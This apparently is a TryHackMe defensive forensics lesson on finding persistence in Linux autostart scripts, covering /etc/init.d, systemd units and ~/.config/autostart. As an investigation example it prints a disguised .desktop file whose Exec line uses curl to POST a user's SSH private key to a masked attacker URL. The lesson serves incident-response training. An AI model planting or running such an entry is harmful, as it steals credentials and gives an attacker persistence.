Autostart scripts, as the name implies, are scripts or commands executed automatically when a system boots up or a user logs in. These scripts are typically used to launch certain programs or commands automatically without manual intervention on login. User-specific autostart scripts differ from cronjobs and services in that they are tailored to run tasks upon system startup or user login rather than at scheduled intervals like cronjobs or continuously like services. They are crucial in automating the initialisation process of various applications or utilities, ensuring that essential components are up and running without requiring manual intervention.

There are generally two types of autostart scripts in Linux systems:

**System-wide autostart scripts**

These scripts are executed when the operating system boots up before users log in. They are often found in directories like `/etc/init.d/`, `/etc/rc.d/`, or `/etc/systemd/system/`. System-wide autostart scripts are typically used to start system services or daemons, similar to the unit files covered in the previous task.

**User-specific autostart scripts**

These scripts are executed when a **user** logs into their account. They are usually found in directories like `~/.config/autostart/` or `~/.config/` (under various subdirectories). User-specific autostart scripts are commonly used to launch user-specific programs or applications upon login.

Like with all of the components we've discussed, attackers can target autostart scripts for various reasons. If an attacker can modify or create autostart scripts, they may be able to abuse this to achieve persistence, install backdoors, disguise malware, or execute privileged commands. For example, by injecting malicious commands or binaries to autostart scripts, attackers can execute a reverse shell in the context of a service account or a user, or abuse permissions to escalate privileges. As such, analysts need to be able to review and harden autostart scripts to detect anomalies and prevent abuse.

Identifying System Autostart Scripts

**/etc/init.d/**

This directory typically contains scripts for system service management in traditional SysV init systems and is primarily responsible for starting, stopping, restarting, and managing system services. Each script corresponds to a specific service and follows a standardised naming convention. For example, you might find scripts like `apache2`, `mysql`, or `ssh`, which control the Apache web server, MySQL database server, and OpenSSH server, respectively. These scripts are usually written in Bash or another shell scripting language.

**/etc/systemd/system/**

This directory is related to the systemd init system, which has become the default init system in many modern Linux distributions. As discussed in the previous task, services are defined by unit files stored in this directory. They specify various parameters and actions related to a service, such as its dependencies, startup behaviour, environment variables, and more.

For example, we can identify the `b4ckd00rftw.service` unit file in `/etc/systemd/system/b4ckd00rftw.service`, another way to investigate potentially malicious or altered services.

Identifying User Autostart Scripts

Many desktop environments place autostart scripts in the user's home directory. As such, they can be a hiding spot for user-targeted malware. Accessing other users' home directories typically requires elevated privileges, such as using `sudo` or `su` commands. As an investigator, you would need appropriate permissions to access these directories. In this case, the **investigator** user is in the **sudoers** group.

**~/.config/autostart/**

The autostart scripts' syntax is usually in the form of `.desktop` files, which are plain text files with a specific format. For example, suppose a user wants to automatically launch a custom script that sets up their development environment upon logging into their Linux desktop. They've written a shell script named `setup_dev_env.sh`, located in their home directory, that updates necessary dependencies, sets up environment variables, and launches their IDE and code editor applications. To automate this process, they can create a `.desktop` file inside `~/.config/autostart/` with the following content:

Example .desktop File

```shell-session
[Desktop Entry]
Type=Application
Name=Setup Development Environment
Exec=/bin/bash -c "/home/eduardo/setup_dev_env.sh"
```

To break down the important syntax of this file in more detail:

- **[Desktop Entry]:** This is the standard file header indicating a desktop autostart file.
- **Name=Setup Development Environment:** The name of the autostart entry.
- **Exec=/bin/bash -c "/home/eduardo/setup_dev_env.sh":** The command to execute on startup. Here, `/bin/bash -c` executes the `setup_dev_env.sh` script using **Bash**.

During an investigation of this nature, we should quickly list the autostart scripts for all users on the system. Once we identify any entries, we should analyse them further to see what scripts or commands they are performing. To do so, we can run a command like:

Enumerating User Autostart Scripts

```shell-session
investigator@tryhackme:~$ ls -a /home/*/.config/autostart
/home/eduardo/.config/autostart:
.  ..  dev.desktop

/home/janice/.config/autostart:
.  ..  keygrabber.desktop
```

From the above output, we have identified a couple of entries. Specifically, `keygrabber.desktop` under **Janice**'s home directory looks interesting. To view the contents of the autostart entry, we can `cat` the file:

Viewing Janice's Autostart Script

```shell-session
investigator@tryhackme:~$ cat /home/janice/.config/autostart/keygrabber.desktop
[Desktop Entry]
Type=Application
Name=Standard Desktop Configuration (DO NOT MODIFY)
Exec=/bin/bash -c "curl -X POST -d '/home/janice/.ssh/id_rsa' http://*****.****-**-********.***/**_***"
```

After analysing the configuration script, it's safe to say we found another persistence method. Specifically, the script uses the `curl` command under the Exec entry to issue a POST request to an external URL. More interestingly, however, the contents of `/home/janice/.ssh/id_rsa` are being sent to the server via the POST request. The `id_rsa` file is Janice's private SSH key and should never be shared, as anyone with the key can connect as Janice to the host.

This configuration suggests that upon startup, it will execute a curl command to send the contents of Janice's SSH private key (id_rsa file) to an attacker-controlled endpoint.

Other user-related configuration files that should be investigated include:

- **~/.bash_history:** This file contains a history of commands executed by the user in the Bash shell, providing insights into their activities and commands executed.
- **~/.ssh:** This directory contains SSH-related files, including a user's SSH keys (**id_rsa**, **id_rsa.pub**), known_hosts, and authorized_keys.
- **~/.profile:** This file typically contains user-specific initialisation commands and settings for their shell environment, and similar to autostart scripts, could contain malicious commands.
- **Message of the Day (MOTD)** While not directly a user-configured file, the Message of the Day is the message that is presented to the user when a user connects to a Linux server via SSH or a serial connection. Linux systems contain several default MOTD files in the `/etc/update-motd.d/` and `/usr/lib/update-notifier/` directories. Like autostart scripts, attackers can create malicious MOTD files that grant them persistence onto the target every time a user connects to the system by executing a backdoor script or command.

The [Linux File System Analysis](https://tryhackme.com/room/linuxfilesystemanalysis) room investigates some of these locations more thoroughly.